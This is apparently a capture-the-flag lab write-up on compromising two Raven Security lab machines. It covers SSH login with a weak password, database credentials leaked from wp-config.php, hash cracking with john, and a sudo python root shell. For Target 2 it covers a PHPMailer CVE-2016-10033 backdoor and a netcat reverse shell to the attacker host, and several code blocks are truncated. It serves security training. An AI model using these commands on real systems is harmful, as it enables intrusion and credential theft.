```

This scan identifies the services below as potential points of entry:
- Target 1
  - SSH on port 22. We may be able to ssh into the target machine if we are able to find correct login information.
  - The target is running an Apache server. We may be able to find an existing vulnerability related to Apache 2.4.10.


The following vulnerabilities were identified on each target:
- Target 1
  - Weak passwords
    - A user's password was found to be the same as their username. This gave initial ssh access to the machine. This is a violation of CWE-521: Weak Password Requirements.
  - Sensitive Information within Source Code
    - One of the flags were found in an HTML comment hosted on a webpage. This is a violation of CWE-615: Inclusion of Sensitive Information in Source Code Comments. 
  - Improper handling of private credentials. 
    - A wp_config.php file was found publicly accessible on the server. This contained database login information. This is a violation of CWE-260: Password in Configuration File.
  - Unsalted password hashes
    - Within the WordPress database there was a `wp_users` table. The user's passwords in this table are unsalted and very weak as they were able to be cracked via john with a simple wordlist. This is a violation CWE-916: Use of Password Hash With Insufficient Computational Effort.
  - Improper user sudo privileges 
    - Steven had sudo privileges to `/usr/bin/python`. Due to this we were able to spawn a root shell. This is a violation of CWE-250: Execution with Unnecessary Privileges.


The following is an output of nikto scan on the machine on both the whole host and the wordpress site hosted on the machine.

      ```
      - From this, we can see that there are 2 users that may have access to the site - `michael` and `steven`.
      - Attempted an SSH connection using the command 
      ```bash
      ssh michael@192.168.1.110
      ```
      - The password for michael's username was `michael`. This exploit was succesful because there are no sort of password complexity/MFA constraints added to the system to prevent a weak password like this.
      -After logging into the system navigate to the `/var/www` directory and ran:
      ```
      grep -RE flag .
      ```
      After allowing to run, the following output was found:

      ![Grep results](images/grep1.png "Grep results")
      
      Note you can also see that flag2 can be found this way.

  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used - SSH/Directory Traversal**
      - From the same `/var/www/` directory location, when I ran an ls and saw there was a flag2.txt already in the directory. Performing a `cat` on this file showed the results of the second flag.

      ![ls results](images/flag2.png "ls results")

  - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used - Improperly Stored Credentials**
      - From the hint given in the activity, I knew there was a `wp_config.php` file located somewhere in the `/var/www/html`. The actual file was located at `/var/www/html/wordpress/wp-config.php`.
      - Doing a cat on the `wp-config.php` file led to the following:
      
      ![cat wp_config](images/wpconfig.png "cat wp_config")
      
      - From this we can see that there is a mysql database running on the machine and we have credentials of `root/R@v3nSecurity`.
      - We can connect to the sql database as seen below and use the wordpress database
        ```
        mysql -uroot -pR@v3nSecurity
        ```
        
        ![SQL Connection](images/sql1.png "SQL Connection")
      
      - After searching through the tables in the database the `wp_posts` table had the information for both flag 3 and 4.
        
        ![Posts](images/sql3.png "SQL Posts")
      
      ```
        mysql> select * from wp_posts where post_title like '%flag%';

  - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce 
      - **Exploit Used - Improper configuration of User Privileges/Unsalted Password Hashes**
      - If we ignore the fact that flag 4 was found in previous steps, from the wp_users table we can see there are password hashes stored for both michael and steven. 
        
        ![Users](images/sql2.png "SQL Users")

      - If we copy over these hashes to a separate file, we can use john to crack the password hash.
        
        ![Hashes](images/wphashes.png "Password Hashes")
      
      - I also separated out steven's hash into a separate file to make cracking with john quicker. (Note if the passwords were salted, john would not have been able to crack the password so easily)
      - After john completed the output was:<br> 
        
        ![Steven pw](images/stevenpass.png "Steven Password")
      
      - Using Steven's login information (`steven/pink84`), SSH into the machine:
        ```
        ssh steven@192.168.1.110
        ```
      - Run `sudo -l` to see what sudo access steven has
      - From the output we can see that steven can run python in escalated privileges. 
      - Use the command `sudo /usr/bin/python -c 'import os; os.system("/bin/sh")'`. After running this and running `whoami` we can see we were able to escalate to root successfully. (Note it is questionable why steven has access to run python as sudo. This may have been a misconfiguration of his privileges.)

      - To find the last flag I did a `cd /` and then ran a find command `find . -name "flag*"`. `flag4` was located at `/root/flag4.txt`

The following is in regards to attacking Target 2.


### Exposed Services (Target 2)

Target 2 was identified with IP Address 192.168.1.115. Running an nmap scan yielded the following

This scan identifies the services below as potential points of entry:
- Target 2
  - SSH on port 22. We may be able to ssh into the target machine if we are able to find correct login information.
  - The target is running an Apache server. We may be able to find an existing vulnerability related to Apache 2.4.10.

Note, similar to the Target 1, clicking around on the Raven Security site and clicking the blog hyperlink from the homepage led to the discovery of a Wordpress site.

To perform a more in depth enumeration we can use gobuster. gobuster was installed using `apt-get update` to first update the repositories and then `apt install gobuster` to actually install the application.

```

As previously we are able to more clearly see that there is indeed a Wordpress installation on the server. One of the interesting directories to look into is the `/vendor` directory.


If I navigate to `http://192.168.1.115/vendor` and sort the items in order of Last Modified descending, I can see there is a `path` file modified more recently than the other files.

![Vendor](images/vendor.PNG "Vendor")

Opening this file led to the discovery of the first flag.

![Target2 Flag1](images/target2Flag1.PNG "Target 2 Flag 1")

```
flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
```

Within the same `vendor` directory there is a `README.MD` file. Opening this file shows that it is in regards to a module called `PHPMailer` which is used for email creation and transferring within PHP.

![PHPMailer README](images/phpMailerReadme.PNG "PHPMailer README")

Also the same `vendor` directory there is a `VERSION` file. Opening this file indicates that the PHPMailer version is `5.2.16`.

We can use `searchspoit` to see whether there may be an existing exploit for this version of PHPMailer. Using searchspoit we have:

![PHPMailer searchsploit](images/searchsploit.PNG "PHPMailer searchsploit")

Looking into the first couple of PHP < 5.2.18 - Remote Execution scripts we can see that the exploits were disclosed as part of `CVE-2016-10033`.

Using the provided `exploit.sh` script I made the modification to point to the correct target.

```sh
#!/bin/bash

  echo "[+] Check ${LOCATION}?cmd=[shell command, e.g. id]"
else
  echo "[!] Exploit failed"

```
[Exploit Script](exploit.sh)

This script uploads a backdoor.php file after it has been run. The backdoor can then be used to exploit remote code execution.

![Exploit](images/exploitRan.PNG "Exploit")


To test this I navigated to `http://192.168.1.115/backdoor.php?cmd=cmd=cat%20/etc/passwd`. This should execute the command `cat /etc/passwd` and output to the screen. Viewing the Page Source output made the command output easier to read.

![passwd](images/passwd.PNG "passwd")

Since we have access to remote code execution we can set up a reverse shell. On my Kali machine I set up a netcat listener on port 4444. And on Target 2, I connected to the same listener by navigating to the url `http://192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`.


![reverse shell](images/reverseShell.PNG "reverse shell")


To find flag2, I did a `cd /var/www/` and did an `ls` the flag 2 was listed as a file in the directory.


![Target 2 Flag 2](images/target2Flag2.PNG "Target 2 Flag 2")


```
flag2{6a8ed560f0b5358ecf844108048eb337}
```

To find flag 3 I ran `find /var/www -type f -iname 'flag*'`. There was a flag in the wordpress folder located at `/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png`

```bash
find /var/www -type f -iname 'flag*'
/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
/var/www/flag2.txt
```

Navigating to http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png
